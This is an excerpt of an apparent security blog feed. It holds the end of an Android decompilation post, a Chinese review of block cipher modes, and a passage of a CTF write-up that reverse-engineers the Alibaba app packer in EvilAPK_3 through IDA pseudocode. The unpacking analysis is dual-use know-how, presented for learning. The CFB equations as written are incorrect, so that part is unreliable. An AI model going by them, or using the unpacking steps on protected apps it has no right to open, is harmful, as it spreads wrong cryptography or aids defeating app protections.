private SynthesizerListener mSynListener = new SynthesizerListener() {        public void onCompleted(SpeechError error) {        }        public void onBufferProgress(int percent, int beginPos, int endPos, String info) {        }        public void onSpeakBegin() {            Log.d(MainActivity.this.TAG, &quot;speakcheck&quot;);        }        public void onSpeakPaused() {        }        public void onSpeakProgress(int percent, int beginPos, int endPos) {        }        public void onSpeakResumed() {        }        public void onEvent(int arg0, int arg1, int arg2, Bundle arg3) {        }    };    private SpeechSynthesizer mTts;    private RecognizerListener recognizerListener = new RecognizerListener() {        public void onBeginOfSpeech() {        }        public void onError(SpeechError error) {        }        public void onEndOfSpeech() {        }        public void onResult(RecognizerResult results, boolean isLast) {            Log.d(MainActivity.this.TAG, results.getResultString());            try {                MainActivity.this.ss = new JSONObject(results.getResultString()).getJSONArray(&quot;ws&quot;).getJSONObject(0).getJSONArray(&quot;cw&quot;).getJSONObject(0).getString(&quot;w&quot;);            } catch (Exception e) {                Log.d(MainActivity.this.TAG, &quot;catch Excepetion&quot;);            }            if (MainActivity.this.ss.equals(&quot;\u4f60\u597d&quot;)) { // 你好                MainActivity.this.getsna();            }            Log.d(MainActivity.this.TAG, MainActivity.this.ss);        }        public void onVolumeChanged(int volume, byte[] var2) {        }        public void onEvent(int eventType, int arg1, int arg2, Bundle obj) {        }    };    private JSONObject res;    private String ss;    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(new background(this));        this.mAudioManager = (AudioManager) getSystemService(&quot;audio&quot;);        this.mAudioManager.setBluetoothScoOn(true);        this.mAudioManager.startBluetoothSco();        SpeechUtility.createUtility(this, &quot;appid=561e6833&quot;);        this.mIat = SpeechRecognizer.createRecognizer(this, this.mInitListener);        this.mTts = SpeechSynthesizer.createSynthesizer(this, null);    }    public void setParam() {        this.mIat.setParameter(SpeechConstant.DOMAIN, &quot;iat&quot;);        this.mIat.setParameter(SpeechConstant.LANGUAGE, &quot;zh_cn&quot;);        this.mIat.setParameter(SpeechConstant.ACCENT, &quot;mandarin&quot;);    }    public void getsna() {        Toast.makeText(this, &quot;haha&quot;, 0).show();    }    protected void onDestroy() {        super.onDestroy();        this.mAudioManager.setBluetoothScoOn(false);        this.mAudioManager.stopBluetoothSco();    }}</code></pre><pre><code class="cpp">signed int __fastcall JNI_OnLoad(_JavaVM *vm){  jclass v2; // r4  _JNIEnv *env; // [sp+4h] [bp-Ch]  env = 0;  if ( vm-&gt;functions-&gt;GetEnv(&amp;vm-&gt;functions, (void **)&amp;env, 65540) )    return -1;  if ( byte_FF45C )    _android_log_write(3, &quot;MSC_LOG&quot;, &quot;JNI_OnLoad is called !&quot;);  v2 = env-&gt;functions-&gt;FindClass(&amp;env-&gt;functions, &quot;java/io/FileDescriptor&quot;);  if ( !v2 &amp;&amp; byte_FF45C )    _android_log_write(3, &quot;MSC_LOG&quot;, &quot;Unable to find Java class java.io.FileDescriptor&quot;);  dword_FFC14 = (int)env-&gt;functions-&gt;GetFieldID(&amp;env-&gt;functions, v2, &quot;descriptor&quot;, &quot;I&quot;);  if ( dword_FFC14 || !byte_FF45C )             // get descriptor in FileDescriptor and judge    return 65540;  _android_log_write(3, &quot;MSC_LOG&quot;, &quot;Unable to find descriptor field in java.io.FileDescriptor&quot;);  return 65540;}</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.jianshu.com/p/a2f826064e29" target="_blank" rel="noopener">https://www.jianshu.com/p/a2f826064e29</a><br><a href="https://blog.csdn.net/jscese/article/details/51005447" target="_blank" rel="noopener">https://blog.csdn.net/jscese/article/details/51005447</a><br><a href="https://blog.csdn.net/zhuzhuzhu22/article/details/80306203" target="_blank" rel="noopener">https://blog.csdn.net/zhuzhuzhu22/article/details/80306203</a><br><a href="https://blog.csdn.net/ldpxxx/article/details/9253369" target="_blank" rel="noopener">https://blog.csdn.net/ldpxxx/article/details/9253369</a><br><a href="https://stackoverflow.com/questions/23624212/how-to-convert-a-float-into-hex" target="_blank" rel="noopener">https://stackoverflow.com/questions/23624212/how-to-convert-a-float-into-hex</a><br><a href="https://www.52pojie.cn/thread-1105062-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1105062-1-1.html</a><br><a href="https://blog.csdn.net/jason0539/article/details/10049899" target="_blank" rel="noopener">https://blog.csdn.net/jason0539/article/details/10049899</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;持续更新。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>分组密码的工作模式</title>
    <link href="blog.b3ale.cn/2020/02/17/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/"/>
    <id>blog.b3ale.cn/2020/02/17/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/</id>
    <published>2020-02-17T14:30:05.000Z</published>
    <updated>2020-03-20T02:48:01.961Z</updated>
    
    <content type="html"><![CDATA[<p>复习一下密码学。</p><a id="more"></a><h1 id="分组密码的工作模式简介"><a href="#分组密码的工作模式简介" class="headerlink" title="分组密码的工作模式简介"></a>分组密码的工作模式简介</h1><p>密码学中，区块（block）密码的工作模式（mode of operation）允许使用同一个区块密码密钥对多于一块的数据进行加密，并保证其安全性。区块密码自身只能加密长度等于密码区块长度的单块数据，若要加密变长数据，则数据必须先被划分为一些单独的密码块。通常而言，最后一块数据也需要使用合适填充方式将数据扩展到符合密码块大小的长度。一种工作模式描述了加密每一数据块的过程，并常常使用基于一个通常称为初始化向量的附加输入值以进行随机化，以保证安全。</p><p>工作模式主要用来进行加密和认证。对加密模式的研究曾经包含数据的完整性保护，即在某些数据被修改后的情况下密码的误差传播特性。后来的研究则将完整性保护作为另一个完全不同的，与加密无关的密码学目标。部分现代的工作模式用有效的方法将加密和认证结合起来，称为认证加密模式。</p><p>虽然工作模式通常应用于对称加密，它亦可以应用于公钥加密，例如在原理上对 RSA 进行处理，但在实用中，公钥密码学通常不用于加密较长的信息，而是使用结合对称加密和公钥加密的混合加密方案。</p><h1 id="初始化向量（IV）"><a href="#初始化向量（IV）" class="headerlink" title="初始化向量（IV）"></a>初始化向量（IV）</h1><p>初始化向量（IV，Initialization Vector）是许多工作模式中用于将加密随机化的一个位块，由此即使同样的明文被多次加密也会产生不同的密文，避免了较慢的重新产生密钥的过程。</p><p>初始化向量与密钥相比有不同的安全性需求，因此 IV 通常无须保密，然而在大多数情况中，不应当在使用同一密钥的情况下两次使用同一个 IV。对于 CBC 和 CFB，重用 IV 会导致泄露明文首个块的某些信息，亦包括两个不同消息中相同的前缀。对于 OFB 和 CTR 而言，重用 IV 会导致完全失去安全性。另外，在 CBC 模式中，IV 在加密时必须是无法预测的；特别的，在许多实现中使用的产生 IV 的方法，例如 SSL2.0 使用的，即采用上一个消息的最后一块密文作为下一个消息的 IV，是不安全的。</p><h1 id="填充（padding）"><a href="#填充（padding）" class="headerlink" title="填充（padding）"></a>填充（padding）</h1><p>块密码只能对确定长度的数据块进行处理，而消息的长度通常是可变的。因此部分模式（即 ECB 和 CBC）需要最后一块在加密前进行填充。有数种填充方法，其中最简单的一种是在明文的最后填充空字符以使其长度为块长度的整数倍，但必须保证可以恢复明文的原始长度；例如，若明文是 C 语言风格的字符串，则只有串尾会有空字符。稍微复杂一点的方法则是原始的 DES 使用的方法，即在数据后添加一个 1 位，再添加足够的 0 位直到满足块长度的要求；若消息长度刚好符合块长度，则添加一个填充块。最复杂的则是针对 CBC 的方法，例如密文窃取，残块终结等，不会产生额外的密文，但会增加一些复杂度。布鲁斯·施奈尔和尼尔斯·弗格森提出了两种简单的可能性：添加一个值为 128 的字节（十六进制的 80），再以 0 字节填满最后一个块；或向最后一个块填充 n 个值均为 n 的字节。</p><p>CFB，OFB 和 CTR 模式不需要对长度不为密码块大小整数倍的消息进行特别的处理。因为这些模式是通过对块密码的输出与明文进行异或工作的。最后一个明文块（可能是不完整的）与密钥流块的前几个字节异或后，产生了与该明文块大小相同的密文块。流密码的这个特性使得它们可以应用在需要密文和明文数据长度严格相等的场合，也可以应用在以流形式传输数据而不便于进行填充的场合。</p><h1 id="常用模式"><a href="#常用模式" class="headerlink" title="常用模式"></a>常用模式</h1><h2 id="电子密码本（ECB）"><a href="#电子密码本（ECB）" class="headerlink" title="电子密码本（ECB）"></a>电子密码本（ECB）</h2><p>最简单的加密模式即为电子密码本（Electronic codebook，ECB）模式。需要加密的消息按照块密码的块大小被分为数个块，并对每个块进行独立加密。</p><p><img src="/pics/分组密码的工作模式/1.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/2.png" srcset="/img/loading.gif" alt></p><p>ECB 的缺点在于同样的明文块会被加密成相同的密文块，因此它不能很好的隐藏数据模式。在某些场合，这种方法不能提供严格的数据保密性，因此并不推荐用于密码协议中。</p><p>ECB 模式也会导致使用它的协议不能提供数据完整性保护，易受到重放攻击的影响，因此每个块是以完全相同的方式解密的。例如，“梦幻之星在线：蓝色脉冲”在线电子游戏使用 ECB 模式的 Blowfish 密码。在密钥交换系统被破解而产生更简单的破解方式前，作弊者重复通过发送加密的“杀死怪物”消息包以非法的快速增加经验值。</p><h2 id="密码块链接（CBC）"><a href="#密码块链接（CBC）" class="headerlink" title="密码块链接（CBC）"></a>密码块链接（CBC）</h2><p>1976 年，IBM 发明了密码分组链接（CBC，Cipher-block chaining）模式。在 CBC 模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。</p><p><img src="/pics/分组密码的工作模式/3.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/4.png" srcset="/img/loading.gif" alt></p><p>若第一个块的下标为 1，则 CBC 模式的加密过程如下：</p><p>$$<br>C_i = E_K(P_i \oplus IV) \\<br>IV = C_i<br>$$</p><p>其解密过程如下：</p><p>$$<br>P_i = D_K(C_i) \oplus IV \\<br>IV = C_i<br>$$</p><p>CBC 是最为常用的工作模式。它的主要缺点在于加密过程是串行的，无法被并行化，而且消息必须被填充到块大小的整数倍。解决后一个问题的一种方法是利用密文窃取。</p><p>注意在加密时，明文中的微小改变会导致其后的全部密文块发生改变，而在解密时，从两个邻接的密文块中即可得到一个明文块。因此，解密过程可以被并行化，而解密时，密文中一位的改变只会导致其对应的明文块完全改变和下一个明文块中对应位发生改变，不会影响到其它明文的内容。</p><h2 id="填充密码块链接（PCBC）"><a href="#填充密码块链接（PCBC）" class="headerlink" title="填充密码块链接（PCBC）"></a>填充密码块链接（PCBC）</h2><p>填充密码块链接（PCBC，Propagating cipher-block chaining）或称为明文密码块链接（Plaintext cipher-block chaining），是一种可以使密文中的微小更改在解密时导致明文大部分错误的模式，并在加密的时候也具有同样的特性。</p><p><img src="/pics/分组密码的工作模式/5.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/6.png" srcset="/img/loading.gif" alt></p><p>PCBC 的加密过程如下：</p><p>$$<br>C_i = E_K(P_i \oplus IV) \\<br>IV = P_i \oplus C_i<br>$$</p><p>其解密过程如下：</p><p>$$<br>P_i = D_K(C_i) \oplus IV \\<br>IV = P_i \oplus C_i<br>$$</p><p>PCBC 主要用于 Kerberos v4 和 WASTE 中，而在其它场合的应用较少。对于使用 PCBC 加密的消息，互换两个邻接的密文块不会对后续块的解密造成影响。正因为这个特性，Kerberos v5 没有使用 PCBC。</p><h2 id="密文反馈（CFB）"><a href="#密文反馈（CFB）" class="headerlink" title="密文反馈（CFB）"></a>密文反馈（CFB）</h2><p>密文反馈（CFB，Cipher feedback）模式类似于 CBC，可以将块密码变为自同步的流密码；工作过程亦非常相似，CFB 的解密过程几乎就是颠倒的 CBC 的加密过程：</p><p>$$<br>C_i = E_K(IV \oplus P_i) \\<br>P_i = E_K(IV \oplus C_i) \\<br>IV = C_i<br>$$</p><p><img src="/pics/分组密码的工作模式/7.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/8.png" srcset="/img/loading.gif" alt></p><p>上述公式是描述的是最简单的 CFB，在这种模式下，它的自同步特性仅仅与 CBC 相同，即若密文的一整块发生错误，CBC 和 CFB 都仍能解密大部分数据，而仅有一位数据错误。若需要在仅有了一位或一字节错误的情况下也让模式具有自同步性，必须每次只加密一位或一字节。可以将移位寄存器作为块密码的输入，以利用 CFB 的自同步性。</p><p>为了利用 CFB 制作一种自同步的，可以处理任意位情况错误的流密码，需要使用一个与块的大小相同的移位寄存器，并用 IV 将寄存器初始化。然后，将寄存器内容使用块密码加密，然后将结果的最高 $x$ 位与明文的 $x$ 进行异或，以产生密文的 $x$ 位。下一步将生成的 $x$ 位密文移入寄存器中，并对下面的 $x$ 位明文重复这一过程。解密过程与加密过程相似，以 IV 开始，对寄存器加密，将结果的高 $x$ 与密文异或，产生 $x$ 位明文，再将密文的下面 $x$ 位移入寄存器。</p><p>下式中 $S_i$ 是移位寄存器的第 $i$ 个状态，$a \ll x$ 是指将 $a$ 移位 $x$ 位，$head(a, x)$ 是指 $a$ 的高 $x$ 位，$n$ 则是指 IV 的位数。</p><p>$$<br>C_i = head(E_K(S_{i-1}), x) \oplus P_i \\<br>P_i = head(E_K(S_{i-1}), x) \oplus C_i \\<br>S_i = ((S_{i-1} \ll x) + C_i) mod\ 2^n \\<br>IV = S_i<br>$$</p><p>若密文的 $x$ 位发生错误，则密码在移位寄存器恢复与加密时的状态相同之前，输出不正确的结果，而当寄存器状态恢复后，密码即可以重新同步，恢复正常输出，因此最多只有一块数据发生错误。</p><p>与 CBC 相似，明文的改变会影响接下来所有的密文，因此加密过程不能并行化；而同样的，与 CBC 类似，解密过程是可以并行化的。在解密时，密文中一位数据的改变仅会影响两个明文块：对应明文块中的一位数据与下一块中全部的数据，而之后的数据将恢复正常。</p><p>CFB 拥有一些 CBC 所不具备的特性，这些特性与 OFB 和 CTR 的流模式相似：只需要使用块密码进行加密操作，且消息无需进行填充（虽然密文窃取也允许数据不进行填充）。</p><h2 id="输出反馈（OFB）"><a href="#输出反馈（OFB）" class="headerlink" title="输出反馈（OFB）"></a>输出反馈（OFB）</h2><p>输出反馈模式（Output feedback, OFB）可以将块密码变成同步的流密码。它产生密钥流的块，然后将其与明文块进行异或，得到密文。与其它流密码一样，密文中一个位的翻转会使明文中同样位置的位也产生翻转。这种特性使得许多错误校正码，例如奇偶校验位，即使在加密前计算，而在加密后进行校验也可以得出正确结果。</p><p>由于 XOR 操作的对称性，加密和解密操作是完全相同的：</p><p>$$<br>C_i = P_i \oplus O_i \\<br>P_i = C_i \oplus O_i \\<br>O_i = E_K(O_{i-1}) \\<br>IV = O_i<br>$$</p><p><img src="/pics/分组密码的工作模式/9.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/10.png" srcset="/img/loading.gif" alt></p><p>每个使用 OFB 的输出块与其前面所有的输出块相关，因此不能并行化处理。然而，由于明文和密文只在最终的异或过程中使用，因此可以事先对 IV 进行加密，最后并行的将明文或密文进行并行的异或处理。</p><p>可以利用输入全 0 的 CBC 模式产生 OFB 模式的密钥流。这种方法十分实用，因为可以利用快速的 CBC 硬件实现来加速 OFB 模式的加密过程。</p><h2 id="计数器模式（CTR）"><a href="#计数器模式（CTR）" class="headerlink" title="计数器模式（CTR）"></a>计数器模式（CTR）</h2><p>PS：CTR 模式（Counter mode，CM）也被称为 ICM 模式（Integer Counter Mode，整数计数模式）和 SIC 模式（Segmented Integer Counter）。</p><p>与 OFB 相似，CTR 将块密码变为流密码。它通过递增一个加密计数器以产生连续的密钥流，其中，计数器可以是任意保证长时间不产生重复输出的函数，但使用一个普通的计数器是最简单和最常见的做法。使用简单的、定义好的输入函数是有争议的：批评者认为它“有意的将密码系统暴露在已知的、系统的输入会造成不必要的风险”。目前，CTR 已经被广泛的使用了，由输入函数造成的问题被认为是使用的块密码的缺陷，而非 CTR 模式本身的弱点。无论如何，有一些特别的攻击方法，例如基于使用简单计数器作为输入的硬件差错攻击。</p><p>CTR 模式的特征类似于 OFB，但它允许在解密时进行随机存取。由于加密和解密过程均可以进行并行处理，CTR 适合运用于多处理器的硬件上。</p><p>注意图中的“nonce”与其它图中的 IV（初始化向量）相同。IV、随机数和计数器均可以通过连接，相加或异或使得相同明文产生不同的密文。</p><p><img src="/pics/分组密码的工作模式/11.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/分组密码的工作模式/12.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复习一下密码学。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="crypto" scheme="blog.b3ale.cn/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>2014-AliCTF-EvilAPK_3</title>
    <link href="blog.b3ale.cn/2020/02/15/2014-AliCTF-EvilAPK_3/"/>
    <id>blog.b3ale.cn/2020/02/15/2014-AliCTF-EvilAPK_3/</id>
    <published>2020-02-15T11:41:35.000Z</published>
    <updated>2020-03-20T01:52:10.549Z</updated>
    
    <content type="html"><![CDATA[<p>接触了一段时间的安卓后复现一下经典的题目，具体审计还有分析的步骤不做记录。</p><a id="more"></a><h1 id="Analysis（classes-dex）"><a href="#Analysis（classes-dex）" class="headerlink" title="Analysis（classes.dex）"></a>Analysis（classes.dex）</h1><p>这道题目是阿里 14 年出的，先导入 jadx 看看反编译后大概的内容。在 AndroidManifest.xml 中，可以看到先设置了入口点为 com.ali.mobisecenhance.StubApplication，猜测这里可能是阿里加固自己添加的一个入口，用来执行一些初始化的操作，比如解密 dex，反调试，检测模拟器等等之类的。调用完 StubApplication 后，才会调用 MainActivity：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.ali.tg.testapp&quot; android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot;&gt;    &lt;uses-sdk android:minSdkVersion=&quot;8&quot; android:targetSdkVersion=&quot;9&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;    &lt;application android:theme=&quot;@style/AppTheme&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@drawable/ic_launcher&quot; android:name=&quot;com.ali.mobisecenhance.StubApplication&quot; android:debuggable=&quot;true&quot; android:allowBackup=&quot;true&quot;&gt;        &lt;activity android:label=&quot;@string/app_name&quot; android:name=&quot;.MainActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;        &lt;activity android:name=&quot;.WebViewActivity&quot; /&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><p>在反编译出来的 Java 文件中，只能找到一个 StubApplication 类，其中的函数都是在 Native 层所实现，且加载了一个 mobisec 库。一般程序中是先执行 onCreate 函数，但 attachBaseContext 函数会早于 onCreate 函数执行：</p><pre><code class="java">package com.ali.mobisecenhance;import android.app.Application;import android.content.Context;public class StubApplication extends Application {    private native void b(ClassLoader classLoader, Context context);    protected native void attachBaseContext(Context context);    public native void onCreate();    static {        System.loadLibrary(&quot;mobisec&quot;);    }}</code></pre><p>可以在 lib 文件夹下看到 libmobisec.so 库，同时还可以看到在 assets 文件夹中有两个 jar 文件：</p><pre><code class="bash">$ tree ..├── AndroidManifest.xml├── META-INF│   ├── MANIFEST.MF│   ├── TEST.RSA│   └── TEST.SF├── assets│   ├── cls.jar│   └── fak.jar├── classes.dex├── lib│   ├── armeabi│   │   ├── libhack.so│   │   ├── libmobisec.so│   │   └── libtranslate.so│   ├── armeabi-v7a│   │   ├── libhack.so│   │   ├── libmobisec.so│   │   └── libtranslate.so│   └── x86│       ├── libhack.so│       ├── libmobisec.so│       └── libtranslate.so├── res│   ├── drawable-hdpi│   │   ├── android.jpg│   │   └── android1.jpg│   ├── drawable-mdpi│   │   └── ic_launcher.png│   ├── drawable-xhdpi│   │   └── ic_launcher.png│   ├── drawable-xxhdpi│   │   └── ic_launcher.png│   └── layout│       ├── activity_main.xml│       └── webviewlayout.xml└── resources.arsc12 directories, 24 files</code></pre><p>file 一下，发现是 cls.jar 是一段不可识别的数据，fak.jar 判断出来是个 zip 文件：</p><pre><code class="bash">$ file cls.jarcls.jar: data$ file fak.jarfak.jar: Zip archive data, at least v?[0x314] to extract</code></pre><p>经过以上粗略的审计，可以猜测可能是在 libmobisec.so 实现了 StubApplication 中的函数，并对 assets 文件夹下的两个文件进行操作来还原出 MainActivity 中的函数。</p><h1 id="Analysis（libmobisec-so）"><a href="#Analysis（libmobisec-so）" class="headerlink" title="Analysis（libmobisec.so）"></a>Analysis（libmobisec.so）</h1><p>打开 IDA，最先定位到 JNI_OnLoad 函数，查看一下注册了哪些函数：</p><pre><code class="cpp">signed int __fastcall JNI_OnLoad(_JavaVM *vm, int a2){  const char *v2; // r2  jclass v3; // r1  signed int result; // r0  bool v5; // zf  _JNIEnv *env; // [sp+4h] [bp-Ch]  env = (_JNIEnv *)a2;  if ( vm-&gt;functions-&gt;GetEnv(&amp;vm-&gt;functions, (void **)&amp;env, 65542) )  {    v2 = &quot;Failed to get the environment&quot;;LABEL_5:    _android_log_print(6, &quot;debug&quot;, v2);    return -1;  }  v3 = env-&gt;functions-&gt;FindClass(&amp;env-&gt;functions, &quot;com/ali/mobisecenhance/StubApplication&quot;);// locate class  if ( !v3 )  {    v2 = &quot;failed to get class reference&quot;;    goto LABEL_5;  }  v5 = env-&gt;functions-&gt;RegisterNatives(&amp;env-&gt;functions, v3, (const JNINativeMethod *)gMethods, 2) == 0;// register 2 methods  result = 65542;  if ( !v5 )    result = -1;  return result;}</code></pre><p>在 RegisterNatives 函数的参数中可以看到注册了两个函数，分别为 attachBaseContext 和 onCreate。在内存中可以找到两个函数对应的指针：</p><pre><code>.data:00054010 gMethods        DCD aAttachbasecont_0   ; DATA XREF: JNI_OnLoad+44↑o.data:00054010                                         ; .text:off_24784↑o.data:00054010                                         ; &quot;attachBaseContext&quot;.data:00054014                 DCD aLandroidConten_1   ; &quot;(Landroid/content/Context;)V&quot;.data:00054018                 DCD sub_24D3C+1.data:0005401C                 DCD aOncreate           ; &quot;onCreate&quot;.data:00054020                 DCD aV                  ; &quot;()V&quot;.data:00054024                 DCD sub_24498+1</code></pre><p>因为 attachBaseContext 先于 onCreate 函数执行，这里先看一下 attachBaseContext。跟着 log 可以对函数有一个大体的了解，在一处 log 里有“enter new application”的信息，猜测可能是完成了解码进入 MainActivity。在该处上下看看可以发现一个 parse_dex 函数，很有可能是解析出真正的 dex 文件的函数：</p><pre><code class="cpp">int __fastcall attachBaseContext(_JNIEnv *a1, jobject *a2, jobject *a3){  jobject *v3; // r8  jobject *v4; // r10  _JNIEnv *env; // r4  _JNIEnv *v6; // r1  int v7; // r2  int result; // r0  ali *v9; // r0  int v10; // r0  int v11; // r0  int v12; // r0  int v13; // r5  int v14; // r0  int v15; // r0  int v16; // r0  int v17; // r0  int v18; // r0  char *v19; // r0  int v20; // r0  int v21; // r0  void *v22; // r0  void *v23; // r8  const char *v24; // r0  const char *v25; // r5  size_t v26; // r0  int v27; // r5  int v28; // r8  int v29; // r0  int v30; // r5  const char *v31; // r2  int v32; // r0  ali *v33; // r0  int v34; // r4  unsigned __int64 v35; // r2  int v36; // [sp+8h] [bp-78h]  __int64 v37; // [sp+18h] [bp-68h]  char v38; // [sp+24h] [bp-5Ch]  char v39; // [sp+3Ch] [bp-44h]  char *v40; // [sp+4Ch] [bp-34h]  char *v41; // [sp+50h] [bp-30h]  v3 = a2;  v4 = a3;  env = a1;  _android_log_print(6, &quot;debug&quot;, &quot;in...&quot;);  result = ali::init_classes(env, v6, v7);      // init classes  if ( result )    return result;  v9 = (ali *)_JNIEnv::CallNonvirtualVoidMethod(env, v3, ali::ContextWrapper, dword_54128, v4);  v36 = ali::NanoTime(v9);  v10 = _JNIEnv::GetObjectClass(env, v3);  v11 = _JNIEnv::GetMethodID(env, v10, &quot;getFilesDir&quot;, &quot;()Ljava/io/File;&quot;);  v12 = _JNIEnv::CallObjectMethod(env, v3, v11);  v13 = v12;  v14 = _JNIEnv::GetObjectClass(env, v12);  v15 = _JNIEnv::GetMethodID(env, v14, &quot;getAbsolutePath&quot;, &quot;()Ljava/lang/String;&quot;);  v16 = _JNIEnv::CallObjectMethod(env, v13, v15);  sub_247D8(&amp;v39, env, v16);  if ( &amp;v39 != (char *)&amp;ali::g_filePath )    std::string::_M_assign((std::string *)&amp;ali::g_filePath, v41, v40);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v39);  _android_log_print(3, &quot;debug&quot;, &quot;global files path is %s&quot;, dword_540E8);  v17 = _JNIEnv::CallObjectMethod(env, v3, dword_541A4);  if ( ali::sdk_int &lt;= 8 )  {    v20 = _JNIEnv::GetObjectField(env, v17, dword_5416C);    sub_247D8(&amp;v38, env, v20);    std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v39, &amp;v38, &quot;/lib&quot;);    if ( &amp;v39 != (char *)&amp;ali::g_libPath )      std::string::_M_assign((std::string *)&amp;ali::g_libPath, v41, v40);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v39);    v19 = &amp;v38;  }  else  {    v18 = _JNIEnv::GetObjectField(env, v17, dword_54170);    sub_247D8(&amp;v39, env, v18);    if ( &amp;v39 != (char *)&amp;ali::g_libPath )      std::string::_M_assign((std::string *)&amp;ali::g_libPath, v41, v40);    v19 = &amp;v39;  }  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(v19);  _android_log_print(3, &quot;debug&quot;, &quot;global native path is %s&quot;, dword_540D0);  v21 = _JNIEnv::CallObjectMethod(env, v3, dword_541B0);  sub_247D8(&amp;v39, env, v21);  if ( &amp;v39 != (char *)&amp;ali::g_apkPath )    std::string::_M_assign((std::string *)&amp;ali::g_apkPath, v41, v40);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v39);  setenv(&quot;APKPATH&quot;, (const char *)dword_540B8, 1);  _android_log_print(3, &quot;debug&quot;, &quot;global apk path is %s&quot;, dword_540B8);  sub_24A64(env, v3);  v22 = (void *)_JNIEnv::CallObjectMethod(env, v4, dword_541A0);  v23 = v22;  if ( v22 )  {    v24 = env-&gt;functions-&gt;GetStringUTFChars(&amp;env-&gt;functions, v22, 0);    v25 = v24;    v26 = strlen(v24);    std::string::_M_assign((std::string *)&amp;ali::g_pkgName, v25, &amp;v25[v26]);    env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, v23, v25);  }  v37 = 0LL;  v27 = _JNIEnv::CallObjectMethod(env, v4, dword_541A8);  parse_dex(env, &amp;v37);                         // parse dex?  replace_classloader_cookie(env, v27, v37, HIDWORD(v37));  _android_log_print(3, &quot;debug&quot;, &quot;enter new application&quot;);// enter MainActivity?  v28 = dword_54120;  _JNIEnv::NewStringUTF(env, &quot;android.app.Application&quot;);  v29 = _JNIEnv::CallObjectMethod(env, v27, v28);  v30 = v29;  if ( v29 )  {    v32 = _JNIEnv::GetMethodID(env, v29, &quot;&lt;init&gt;&quot;, &quot;()V&quot;);    dword_540A0 = _JNIEnv::NewObject(env, v30, v32);    _JNIEnv::CallVoidMethod(env, dword_540A0, dword_54134, v4);    _JNIEnv::DeleteLocalRef(env, v30);    v31 = &quot;exit new application&quot;;  }  else  {    v31 = &quot;can&#39;t findClass realAppClass&quot;;  }  v33 = (ali *)_android_log_print(3, &quot;debug&quot;, v31);  if ( dword_540A0 )  {    v33 = (ali *)env-&gt;functions-&gt;NewGlobalRef(&amp;env-&gt;functions, (jobject)dword_540A0);    dword_540A0 = (int)v33;  }  v34 = ali::NanoTime(v33);  _android_log_print(3, &quot;debug&quot;, &quot;##### attachBaseContext spent:&quot;);  ali::PrettyDuration((ali *)(v34 - v36), v35);  result = _android_log_print(3, &quot;debug&quot;, &quot;exit attachBaseContext&quot;);  return result;}</code></pre><p>接下来进入 parse_dex 进行分析。一开始判断了是采用了 Dalvik 模式还是 ART 模式。我的机器是 Android 4.4.4，用的是 Dalvik 模式，那就只分析一下 Dalvik 的部分。接下来对 SDK 的版本进行了判断，是否大于 SDK13。我用的机器是 SDK19，故下面应该是调用了 openWithHeader 函数。之后的部分看到是用 dlopen 打开 libdvm.so，并开始执行程序，所以就不做进一步分析。主要应该就是 openWithHeader 中的内容解析了出了 dex 文件：</p><pre><code class="cpp">signed int __fastcall parse_dex(_JNIEnv *a1, __int64 *a2){  int v2; // r7  const char *v3; // r1  char *v4; // r0  char *v5; // r9  unsigned __int8 *v6; // r3  int v7; // r2  int v8; // t1  int fd; // ST14_4  int v10; // r8  int v11; // r7  int v12; // r5  int v13; // r0  int v14; // r5  int v15; // r0  int v16; // r7  int v17; // r1  int v18; // r5  int (__fastcall *v19)(int, signed int); // r5  int 